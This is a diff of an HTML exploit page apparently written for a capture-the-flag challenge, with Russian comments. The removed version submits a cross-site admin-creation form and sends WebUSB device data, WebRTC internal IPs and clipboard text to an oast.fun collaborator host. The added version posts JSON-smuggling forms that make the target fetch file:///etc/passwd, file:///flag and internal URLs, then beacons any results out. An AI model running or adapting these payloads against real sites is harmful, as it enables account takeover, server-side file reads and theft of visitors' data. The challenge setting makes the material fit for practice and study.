@@ -1,57 +1,51 @@
 <!DOCTYPE html>
-<form method="POST" action="https://tasks.goidactf.ru:20431/create_admin" target="_blank">
-    <input name="new_admin_login" value="NO_FETCH_ADMIN">
-</form>
-
-<iframe name="resultFrame" style="display:none"></iframe>
+<iframe name="ssrfResult" style="display:none"></iframe>
 
 <script>
+const TARGET = 'https://tasks.goidactf.ru:20431';
 const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 
-// 1. Отправляем форму создания админа
-document.forms[0].submit();
+// URLs для тестирования
+const testURLs = [
+    'file:///flag',
+    'file:///etc/passwd',
+    'http://d39b126c-4ef5-4750-8740-2efb6b0b0166.local/admin',
+    'http://8447d341-c19f-4e29-8561-e345a5cf6c26.local/flag',
+    'http://localhost/flag',
+    'http://127.0.0.1:80/flag'
+];
 
-// 2. WebUSB (без fetch)
-setTimeout(() => {
-    if (navigator.usb) {
-        navigator.usb.requestDevice({ filters: [] })
-        .then(device => {
-            // Отправляем инфу через Image
-            const data = `USB: ${device.vendorId}:${device.productId} ${device.productName || ''}`;
-            new Image().src = COLLAB + '/?usb=' + encodeURIComponent(data);
-        })
-        .catch(e => {
-            new Image().src = COLLAB + '/?usb_error=' + encodeURIComponent(e.message);
-        });
-    }
-}, 1000);
-
-// 3. WebRTC для внутреннего IP (без fetch)
-setTimeout(() => {
-    const pc = new RTCPeerConnection({iceServers: []});
-    pc.createDataChannel('');
-    pc.createOffer().then(offer => pc.setLocalDescription(offer));
-    
-    pc.onicecandidate = (ice) => {
-        if (ice.candidate && ice.candidate.candidate) {
-            new Image().src = COLLAB + '/?ice=' + encodeURIComponent(ice.candidate.candidate);
-        }
-    };
-}, 2000);
-
-// 4. Clipboard API (без fetch)
-setTimeout(() => {
-    if (navigator.clipboard && navigator.clipboard.readText) {
-        navigator.clipboard.readText()
-        .then(text => {
-            if (text) {
-                new Image().src = COLLAB + '/?clipboard=' + encodeURIComponent(text.substring(0, 200));
+testURLs.forEach((url, index) => {
+    setTimeout(() => {
+        // Создаём форму которая отправит запрос
+        const form = document.createElement('form');
+        form.method = 'POST';
+        form.action = TARGET + '/get_url';
+        form.target = 'ssrfResult';
+        form.enctype = 'text/plain';
+        
+        // Создаём правильный JSON
+        const input = document.createElement('input');
+        input.name = `{"url":"${url}","test":"`;
+        input.value = 'test"}';
+        
+        form.appendChild(input);
+        document.body.appendChild(form);
+        form.submit();
+        
+        // Через 3 секунды читаем window.name iframe
+        setTimeout(() => {
+            try {
+                const result = window.frames['ssrfResult'].name;
+                if (result && result.length > 0) {
+                    // Отправляем результат
+                    new Image().src = COLLAB + '/?ssrf_data_' + index + '=' + 
+                                     encodeURIComponent(result.substring(0, 500));
+                }
+            } catch(e) {
+                // CORS блокирует - это нормально
             }
-        })
-        .catch(() => {
-            // Пробуем записать
-            navigator.clipboard.writeText('CTF_' + Date.now());
-        });
-    }
-}, 3000);
+        }, 3000);
+    }, index * 5000); // 5 секунд между запросами
+});
 </script>
